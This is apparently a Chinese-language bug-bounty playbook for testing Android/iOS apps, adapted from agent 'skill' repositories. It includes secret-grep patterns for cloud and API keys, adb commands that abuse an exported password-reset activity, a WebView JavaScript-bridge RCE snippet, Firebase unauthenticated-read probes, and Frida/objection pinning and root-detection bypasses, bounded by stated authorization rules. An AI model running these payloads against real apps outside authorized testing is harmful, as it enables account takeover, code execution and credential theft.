# 移动端 / IoT（Android / iOS）

> 移动端漏洞 = 客户端做了「不该客户端做」的安全决策（鉴权、加密、校验）。APK 中泄露硬编码 secret / API key → P1（$500–$3k）；导出组件能触发账户操作 → P0；中间人能读 token → P0–P1。SRC 出货率最高的三类：硬编码凭据、导出组件越权、Firebase 未授权。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)
- [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)
- 权威公开源：OWASP MASVS / Mobile Top 10 2024 / Frida CodeShare

---

## 1. 触发信号

- 目标有移动 App 目录：Play Store 开发者页下挂 1+ 个 App，或 web 子域直接托管 `*.apk`（一次授权演练中在某子域找到 `Recruitz.apk`）`[Claude-BugHunter]`
- stealer log 泄露包名（`*@com.<corp>.<app>` 格式）`[Claude-BugHunter]`
- 目标是多品牌集团 / 客户 App / 经销商门户 / 员工伴生 App，且 bounty 范围含 Android `[Claude-BugHunter]`
- 需要找服务端「隐藏端点」：APP 暴露的内部接口通常 PC 端没暴露 `[本地 src-hunter]`

## 2. 高频入口点

**OWASP Mobile Top 10 2024 映射** `[本地 src-hunter]`：

| ID | 风险 | Android | iOS |
|----|------|---------|------|
| M1 | 凭证使用 | Keystore 误用、硬编码 | Keychain 配置 |
| M3 | 认证/授权 | Intent 劫持、导出组件 | URL Scheme 劫持 |
| M4 | 输入输出 | WebView XSS | WKWebView 注入 |
| M5 | 通信 | 证书校验绕过、明文 | ATS 配置不当 |
| M9 | 数据存储 | SharedPreferences 明文 | NSUserDefaults |

**APK 静态入口点**（按命中率排序）`[Claude-BugHunter]`：
- `AndroidManifest.xml` 的 `android:exported="true"` / intent-filter
- `google-services.json`、`res/values/strings.xml`、`assets/*.cer|der|pem`
- `network_security_config.xml`（看 pinning 与明文放行）
- `classes*.dex` 字符串（60-pattern secret 目录，见 §4.1）

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **资产盘点（纯被动）**：刮 Play Store 开发者页取 package ID → 与 stealer log / 品牌置换名交叉 `[Claude-BugHunter]`。
2. **获取 APK**：APKPure 直链（302 跟随）→ APKMirror / APKPure 搜索兜底；`.xapk` 先解外层再解内层 `base.apk` `[Claude-BugHunter]`。
3. **静态反编译**：`jadx` 出 Java + `apktool` 解 smali/资源；跑 secret grep（命中硬编码 key / URL / JWT 即停，无需动态）`[Claude-BugHunter]`。
4. **导出组件枚举 + 静态判断**：列 exported 组件，逐个看 extra 是否流入 WebView / URI / 转发到其他 Activity `[Claude-BugHunter]`。
5. **动态**：rooted/模拟器 + Frida server + 绕 pinning + MITM，跑 App 各功能抓全量 API `[Claude-Red]`。
6. **数据存储审计**：`shared_prefs/*.xml`、`databases/*.db`、`files/`、外置存储明文 token `[Claude-Red]`。
7. **API 端点当 Web 测**：删 token 看是否仍可访问 / IDOR / Mass Assignment / SQLi / RCE `[本地 src-hunter]`。

> 不命中就降级：静态找不到 secret → 转动态抓运行时 token；无 exported 组件 → 查 deep link / URL scheme / WebView。

## 4. Payload 区（每条标注出处）

### 4.1 基础探测 `[Claude-BugHunter]`

```bash
# secret grep（60-pattern 目录节选）
grep -oE 'AKIA[A-Z0-9]{16}' strings_<pkg>.txt              # AWS Access Key
grep -oE 'AIza[A-Za-z0-9_-]{35}' strings_<pkg>.txt         # Google API key
grep -oE 'gh[ps]_[A-Za-z0-9]{36}' strings_<pkg>.txt        # GitHub PAT
grep -oE 'sk-[A-Za-z0-9]{48}' strings_<pkg>.txt            # OpenAI API key
grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_<pkg>.txt  # JWT
# URL / 内网 IP
grep -oE 'https?://(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.)[0-9.]+(:[0-9]+)?' strings_<pkg>.txt

# 导出组件枚举
grep -E 'android:exported="true"' decompiled_<pkg>/resources/AndroidManifest.xml
```

### 4.2 数据提取 / 进阶

**导出组件越权调用** `[本地 src-hunter]`：

```bash
# 攻击者 APP 直接启动导出 Activity（改密码/绑手机）
adb shell am start -n com.victim.app/.admin.ResetPasswordActivity --es new_password "hacked123"
# Provider 读数据
adb shell content query --uri content://com.victim.app.provider/users
```

**WebView JS bridge → 反射 RCE**（API < 17 + `addJavascriptInterface`）`[本地 src-hunter]`：

```js
function exec(cmd){ return Android.getClass().forName("java.lang.Runtime")
    .getMethod("getRuntime", null).invoke(null, null).exec(cmd); }
exec("id");
```

**Firebase 未授权读** `[Claude-Red]`：

```bash
strings app.apk | grep -E "https://[a-z0-9-]+\.firebaseio\.com"
curl https://target-app.firebaseio.com/.json        # 返回数据 = 未授权读
curl "https://firestore.googleapis.com/v1/projects/<project_id>/databases/(default)/documents/users"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"   # [Claude-BugHunter]
```

**Intent 重定向**（漏洞代码）：`getParcelableExtra("next_intent")` / `Intent.parseUri(uri, 0)` 后 `startActivity` → 任意内部 Activity 可达 `[本地 src-hunter]`。

### 4.3 Bypass 矩阵 `[本地 src-hunter]`

| 拦 | 绕 |
|---|---|
| 证书 pinning | Frida sslpinning script / objection / SSL Killswitch（iOS） |
| Root/越狱检测 | objection `android root disable` / Frida hook `File.exists` / `stat` |
| 反调试 | Frida 反 anti-frida / 改 ptrace 调用 |
| 代码混淆 | jadx 仍能看大致结构 / 关注 native 库 |
| Native 库 | Ghidra / IDA 反编译 `.so` / dyld |
| 加固 | 360 加固、腾讯乐固 → frida-dexdump 脱壳 |

## 5. 工具用法

```bash
# 静态
apktool d app.apk -o app/          # 资源 + smali
jadx -d app_src/ app.apk           # Java 反编译
gitleaks detect --source app_src/  # secret 扫描  [Claude-Red]
# 导出组件批量测试（drozer）
drozer console connect
> run app.package.attacksurface com.vendor.app
> run app.provider.query content://com.vendor.app.provider/secrets   # [Claude-Red]

# 动态（pinning 绕过 + MITM）
pip install frida-tools objection
frida -U -l frida-script-pinning-bypass.js -f <package_id> --no-pause   # [Claude-BugHunter]
objection -g com.vendor.app explore
> android sslpinning disable
> android root disable                                                # [Claude-Red]
mitmproxy --listen-port 8080                                          # [Claude-BugHunter]
```

> 固定打法：装 CA → 绕 pinning → 跑功能 → 抓全量请求 → 每个 endpoint 当 Web API 测 `[本地 src-hunter]`。

## 6. 证据要求

**「已确认」必须满足**：
- 硬编码凭据：`aws sts get-caller-identity` 返回 ARN（仅身份验证，不列举/读资源）`[本地 src-hunter]`。
- 导出组件：被启动 Activity 的截图 + 操作结果（在自己账号上验证）`[本地 src-hunter]`。
- Firebase 未授权：`/.json` 返回真实数据（截图）。写权限必须写唯一 marker 并回读 `[Claude-BugHunter hunt-cloud-misconfig]`。

**PoC 必备**：APK hash + 版本号；jadx 反编译代码 + 文件路径截图；adb/Frida/Burp 操作步骤。

**CVSS 参考** `[本地 src-hunter]`：导出组件重置任意密码 = 8.8 High；WebView JS bridge RCE = 8.1 High；硬编码生产 AWS key = 9.1–9.8 Critical；缺 pinning + 弱 token = 6.5–8.1；明文存 token = 6.5。

## 7. 合规边界 / 不要做的事

- **禁**：用硬编码凭据实际操作云资源（创建/删除/列举）——仅 `sts get-caller-identity` 验证。
- **禁**：通过导出组件实际触发支付/转账/删数据；只在自己控制的账号上验证。
- **禁**：把反编译源码/字符串上传第三方或 GitHub；本地保存、报告后删除。
- **禁**：生产环境批量调 APP 内部接口（触发风控被封号）。
- **限**：测试设备用研究员自己的；Frida 只在 rooted 模拟器/测试机跑，不上生产设备 `[Claude-BugHunter]`。
